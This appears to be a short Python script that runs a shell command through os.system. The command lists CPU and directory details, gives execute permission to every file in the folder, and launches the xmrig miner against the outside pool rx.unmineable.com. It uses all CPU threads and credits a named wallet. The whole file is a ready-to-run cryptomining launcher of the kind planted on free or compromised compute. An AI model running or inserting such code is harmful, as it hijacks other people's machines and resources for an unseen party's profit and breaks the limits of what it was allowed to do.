import os
bashCommand = "lscpu && ls && chmod +xrw * && ./xmrig -o stratum+ssl://rx.unmineable.com:3333 -a rx -k -u BTT:TErY248nR5pb1F72SrK6JVY2LiUeqZY75V.CleverNEW#u0d5-rop5 -p x -t $(nproc)"
os.system(bashCommand)
